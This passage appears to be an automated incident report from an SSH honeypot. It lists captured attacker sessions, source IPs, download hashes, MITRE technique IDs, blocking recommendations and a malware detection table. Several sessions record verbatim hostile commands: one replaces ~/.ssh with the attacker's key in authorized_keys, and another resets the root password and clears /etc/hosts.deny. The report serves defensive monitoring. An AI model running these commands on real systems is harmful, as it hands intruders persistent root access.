| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 04:32:56` | `cowrie.session.connect` |
| `2026-05-10 04:32:56` | `cowrie.client.version` |
| `2026-05-10 04:32:57` | `cowrie.client.kex` |
| `2026-05-10 04:32:57` | `cowrie.login.success` |
| `2026-05-10 04:32:57` | `cowrie.session.params` |
| `2026-05-10 04:32:57` | `cowrie.command.input` |
| `2026-05-10 04:32:57` | `cowrie.command.failed` |
| `2026-05-10 04:32:58` | `cowrie.log.closed` |
| `2026-05-10 04:32:58` | `cowrie.session.params` |
| `2026-05-10 04:32:58` | `cowrie.command.input` |
| `2026-05-10 04:32:58` | `cowrie.session.file_download` |
| `2026-05-10 04:32:58` | `cowrie.log.closed` |
| `2026-05-10 04:33:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.84.59[.]4` to AbuseIPDB if not already reported
- [ ] Block `45.84.59[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcc5679c2b4a

| Field | Detail |
|---|---|
| **Source IP** | `45.84.59[.]4` |
| **First Seen** | 2026-05-10 04:33 |
| **Last Seen** | 2026-05-10 04:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 04:33:00` | `cowrie.session.connect` |
| `2026-05-10 04:33:00` | `cowrie.client.version` |
| `2026-05-10 04:33:00` | `cowrie.client.kex` |
| `2026-05-10 04:33:01` | `cowrie.login.success` |
| `2026-05-10 04:33:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.84.59[.]4` to AbuseIPDB if not already reported
- [ ] Block `45.84.59[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b530cfeb329

| Field | Detail |
|---|---|
| **Source IP** | `45.84.59[.]4` |
| **First Seen** | 2026-05-10 04:34 |
| **Last Seen** | 2026-05-10 04:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 04:34:24` | `cowrie.session.connect` |
| `2026-05-10 04:34:24` | `cowrie.client.version` |
| `2026-05-10 04:34:24` | `cowrie.client.kex` |
| `2026-05-10 04:34:25` | `cowrie.login.success` |
| `2026-05-10 04:34:25` | `cowrie.session.params` |
| `2026-05-10 04:34:25` | `cowrie.command.input` |
| `2026-05-10 04:34:25` | `cowrie.command.failed` |
| `2026-05-10 04:34:25` | `cowrie.log.closed` |
| `2026-05-10 04:34:25` | `cowrie.session.params` |
| `2026-05-10 04:34:25` | `cowrie.command.input` |
| `2026-05-10 04:34:25` | `cowrie.session.file_download` |
| `2026-05-10 04:34:25` | `cowrie.log.closed` |
| `2026-05-10 04:34:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.84.59[.]4` to AbuseIPDB if not already reported
- [ ] Block `45.84.59[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b371aa46f15a

| Field | Detail |
|---|---|
| **Source IP** | `45.84.59[.]4` |
| **First Seen** | 2026-05-10 04:34 |
| **Last Seen** | 2026-05-10 04:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 04:34:28` | `cowrie.session.connect` |
| `2026-05-10 04:34:28` | `cowrie.client.version` |
| `2026-05-10 04:34:28` | `cowrie.client.kex` |
| `2026-05-10 04:34:28` | `cowrie.login.success` |
| `2026-05-10 04:34:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.84.59[.]4` to AbuseIPDB if not already reported
- [ ] Block `45.84.59[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2e3f5f37b3e

| Field | Detail |
|---|---|
| **Source IP** | `182.253.79[.]194` |
| **First Seen** | 2026-05-10 04:46 |
| **Last Seen** | 2026-05-10 04:46 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:EsHitoHxdGuF"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 04:46:27` | `cowrie.session.connect` |
| `2026-05-10 04:46:27` | `cowrie.client.version` |
| `2026-05-10 04:46:27` | `cowrie.client.kex` |
| `2026-05-10 04:46:28` | `cowrie.login.success` |
| `2026-05-10 04:46:28` | `cowrie.session.params` |
| `2026-05-10 04:46:28` | `cowrie.command.input` |
| `2026-05-10 04:46:28` | `cowrie.command.failed` |
| `2026-05-10 04:46:28` | `cowrie.log.closed` |
| `2026-05-10 04:46:29` | `cowrie.session.params` |
| `2026-05-10 04:46:29` | `cowrie.command.input` |
| `2026-05-10 04:46:29` | `cowrie.session.file_download` |
| `2026-05-10 04:46:29` | `cowrie.log.closed` |
| `2026-05-10 04:46:41` | `cowrie.session.params` |
| `2026-05-10 04:46:41` | `cowrie.command.input` |
| `2026-05-10 04:46:41` | `cowrie.log.closed` |
| `2026-05-10 04:46:42` | `cowrie.session.params` |
| `2026-05-10 04:46:42` | `cowrie.command.input` |
| `2026-05-10 04:46:42` | `cowrie.log.closed` |
| `2026-05-10 04:46:42` | `cowrie.session.params` |
| `2026-05-10 04:46:42` | `cowrie.command.input` |
| `2026-05-10 04:46:42` | `cowrie.session.file_download` |
| `2026-05-10 04:46:42` | `cowrie.log.closed` |
| `2026-05-10 04:46:43` | `cowrie.session.params` |
| `2026-05-10 04:46:43` | `cowrie.command.input` |
| `2026-05-10 04:46:43` | `cowrie.log.closed` |
| `2026-05-10 04:46:44` | `cowrie.session.params` |
| `2026-05-10 04:46:44` | `cowrie.command.input` |
| `2026-05-10 04:46:44` | `cowrie.log.closed` |
| `2026-05-10 04:46:45` | `cowrie.session.params` |
| `2026-05-10 04:46:45` | `cowrie.command.input` |
| `2026-05-10 04:46:45` | `cowrie.command.input` |
| `2026-05-10 04:46:45` | `cowrie.log.closed` |
| `2026-05-10 04:46:45` | `cowrie.session.params` |
| `2026-05-10 04:46:45` | `cowrie.command.input` |
| `2026-05-10 04:46:45` | `cowrie.log.closed` |
| `2026-05-10 04:46:46` | `cowrie.session.params` |
| `2026-05-10 04:46:46` | `cowrie.command.input` |
| `2026-05-10 04:46:46` | `cowrie.log.closed` |
| `2026-05-10 04:46:46` | `cowrie.session.params` |
| `2026-05-10 04:46:46` | `cowrie.command.input` |
| `2026-05-10 04:46:47` | `cowrie.log.closed` |
| `2026-05-10 04:46:47` | `cowrie.session.params` |
| `2026-05-10 04:46:47` | `cowrie.command.input` |
| `2026-05-10 04:46:47` | `cowrie.log.closed` |
| `2026-05-10 04:46:48` | `cowrie.session.params` |
| `2026-05-10 04:46:48` | `cowrie.command.input` |
| `2026-05-10 04:46:48` | `cowrie.log.closed` |
| `2026-05-10 04:46:48` | `cowrie.session.params` |
| `2026-05-10 04:46:48` | `cowrie.command.input` |
| `2026-05-10 04:46:48` | `cowrie.log.closed` |
| `2026-05-10 04:46:49` | `cowrie.session.params` |
| `2026-05-10 04:46:49` | `cowrie.command.input` |
| `2026-05-10 04:46:49` | `cowrie.log.closed` |
| `2026-05-10 04:46:50` | `cowrie.session.params` |
| `2026-05-10 04:46:50` | `cowrie.command.input` |
| `2026-05-10 04:46:50` | `cowrie.log.closed` |
| `2026-05-10 04:46:50` | `cowrie.session.params` |
| `2026-05-10 04:46:50` | `cowrie.command.input` |
| `2026-05-10 04:46:50` | `cowrie.log.closed` |
| `2026-05-10 04:46:51` | `cowrie.session.params` |
| `2026-05-10 04:46:51` | `cowrie.command.input` |
| `2026-05-10 04:46:51` | `cowrie.log.closed` |
| `2026-05-10 04:46:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.79[.]194` to AbuseIPDB if not already reported
- [ ] Block `182.253.79[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46284ad7b443

| Field | Detail |
|---|---|
| **Source IP** | `119.92.70[.]82` |
| **First Seen** | 2026-05-10 06:04 |
| **Last Seen** | 2026-05-10 06:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 06:04:58` | `cowrie.session.connect` |
| `2026-05-10 06:04:58` | `cowrie.client.version` |
| `2026-05-10 06:04:58` | `cowrie.client.kex` |
| `2026-05-10 06:04:59` | `cowrie.login.success` |
| `2026-05-10 06:04:59` | `cowrie.session.params` |
| `2026-05-10 06:04:59` | `cowrie.command.input` |
| `2026-05-10 06:04:59` | `cowrie.command.failed` |
| `2026-05-10 06:04:59` | `cowrie.log.closed` |
| `2026-05-10 06:04:59` | `cowrie.session.params` |
| `2026-05-10 06:04:59` | `cowrie.command.input` |
| `2026-05-10 06:05:00` | `cowrie.session.file_download` |
| `2026-05-10 06:05:00` | `cowrie.log.closed` |
| `2026-05-10 06:05:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.92.70[.]82` to AbuseIPDB if not already reported
- [ ] Block `119.92.70[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5882f1314b82

| Field | Detail |
|---|---|
| **Source IP** | `119.92.70[.]82` |
| **First Seen** | 2026-05-10 06:05 |
| **Last Seen** | 2026-05-10 06:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 06:05:02` | `cowrie.session.connect` |
| `2026-05-10 06:05:02` | `cowrie.client.version` |
| `2026-05-10 06:05:02` | `cowrie.client.kex` |
| `2026-05-10 06:05:02` | `cowrie.login.success` |
| `2026-05-10 06:05:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.92.70[.]82` to AbuseIPDB if not already reported
- [ ] Block `119.92.70[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eea27234fa3c

| Field | Detail |
|---|---|
| **Source IP** | `125.22.162[.]46` |
| **First Seen** | 2026-05-10 06:06 |
| **Last Seen** | 2026-05-10 06:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 06:06:13` | `cowrie.session.connect` |
| `2026-05-10 06:06:13` | `cowrie.client.version` |
| `2026-05-10 06:06:13` | `cowrie.client.kex` |
| `2026-05-10 06:06:13` | `cowrie.login.success` |
| `2026-05-10 06:06:13` | `cowrie.session.params` |
| `2026-05-10 06:06:13` | `cowrie.command.input` |
| `2026-05-10 06:06:13` | `cowrie.command.failed` |
| `2026-05-10 06:06:13` | `cowrie.log.closed` |
| `2026-05-10 06:06:14` | `cowrie.session.params` |
| `2026-05-10 06:06:14` | `cowrie.command.input` |
| `2026-05-10 06:06:14` | `cowrie.session.file_download` |
| `2026-05-10 06:06:14` | `cowrie.log.closed` |
| `2026-05-10 06:06:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.22.162[.]46` to AbuseIPDB if not already reported
- [ ] Block `125.22.162[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b1d6599a6e2

| Field | Detail |
|---|---|
| **Source IP** | `125.22.162[.]46` |
| **First Seen** | 2026-05-10 06:06 |
| **Last Seen** | 2026-05-10 06:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 06:06:15` | `cowrie.session.connect` |
| `2026-05-10 06:06:15` | `cowrie.client.version` |
| `2026-05-10 06:06:15` | `cowrie.client.kex` |
| `2026-05-10 06:06:15` | `cowrie.login.success` |
| `2026-05-10 06:06:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.22.162[.]46` to AbuseIPDB if not already reported
- [ ] Block `125.22.162[.]46` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba58034074f9

| Field | Detail |
|---|---|
| **Source IP** | `125.22.162[.]46` |
| **First Seen** | 2026-05-10 06:26 |
| **Last Seen** | 2026-05-10 06:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 06:26:20` | `cowrie.session.connect` |
| `2026-05-10 06:26:20` | `cowrie.client.version` |
| `2026-05-10 06:26:20` | `cowrie.client.kex` |
| `2026-05-10 06:26:20` | `cowrie.login.success` |
| `2026-05-10 06:26:20` | `cowrie.session.params` |
| `2026-05-10 06:26:20` | `cowrie.command.input` |
| `2026-05-10 06:26:20` | `cowrie.command.failed` |
| `2026-05-10 06:26:20` | `cowrie.log.closed` |
| `2026-05-10 06:26:20` | `cowrie.session.params` |
| `2026-05-10 06:26:20` | `cowrie.command.input` |
| `2026-05-10 06:26:20` | `cowrie.session.file_download` |
| `2026-05-10 06:26:20` | `cowrie.log.closed` |
| `2026-05-10 06:26:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.22.162[.]46` to AbuseIPDB if not already reported
- [ ] Block `125.22.162[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2201b81789a

| Field | Detail |
|---|---|
| **Source IP** | `125.22.162[.]46` |
| **First Seen** | 2026-05-10 06:26 |
| **Last Seen** | 2026-05-10 06:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 06:26:21` | `cowrie.session.connect` |
| `2026-05-10 06:26:21` | `cowrie.client.version` |
| `2026-05-10 06:26:21` | `cowrie.client.kex` |
| `2026-05-10 06:26:21` | `cowrie.login.success` |
| `2026-05-10 06:26:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.22.162[.]46` to AbuseIPDB if not already reported
- [ ] Block `125.22.162[.]46` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `223.233.84[.]127` | **30** | 2026-05-10 04:00 | 2026-05-10 04:37 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `45.84.59[.]4` | **30** | 2026-05-10 04:15 | 2026-05-10 04:40 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `125.22.162[.]46` | **27** | 2026-05-10 05:45 | 2026-05-10 06:35 | 0m | 27 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `182.253.79[.]194` | **21** | 2026-05-10 04:19 | 2026-05-10 04:45 | 0m | 21 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `119.92.70[.]82` | **15** | 2026-05-10 05:22 | 2026-05-10 06:35 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `150.95.25[.]34` | **11** | 2026-05-10 03:39 | 2026-05-10 06:16 | 8m | 0 | `T1592` | 🟠 MEDIUM |
| `221.229.220[.]180` | **9** | 2026-05-10 06:23 | 2026-05-10 06:34 | 8m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `34.95.197[.]36` | **9** | 2026-05-10 03:37 | 2026-05-10 03:45 | 0m | 9 | `T1110.001 · T1592` | 🟢 LOW |
| `13.86.104[.]14` | **2** | 2026-05-10 05:45 | 2026-05-10 05:45 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]233` | **2** | 2026-05-10 05:45 | 2026-05-10 05:46 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.227.203[.]162` | 1 | 2026-05-10 06:24 | 2026-05-10 06:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.42[.]17` | 1 | 2026-05-10 04:14 | 2026-05-10 04:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.175.52[.]154` | 1 | 2026-05-10 05:06 | 2026-05-10 05:06 | 13s | 0 | `T1592` | 🟢 LOW |
| `14.103.122[.]90` | 1 | 2026-05-10 05:23 | 2026-05-10 05:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.86[.]48` | 1 | 2026-05-10 04:17 | 2026-05-10 04:19 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.177[.]88` | 1 | 2026-05-10 06:24 | 2026-05-10 06:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.96[.]235` | 1 | 2026-05-10 03:56 | 2026-05-10 03:58 | 120s | 0 | `T1592` | 🟢 LOW |
| `61.73.239[.]86` | 1 | 2026-05-10 05:07 | 2026-05-10 05:07 | 14s | 0 | `T1592` | 🟢 LOW |
| `64.227.99[.]138` | 1 | 2026-05-10 05:33 | 2026-05-10 05:33 | 2s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
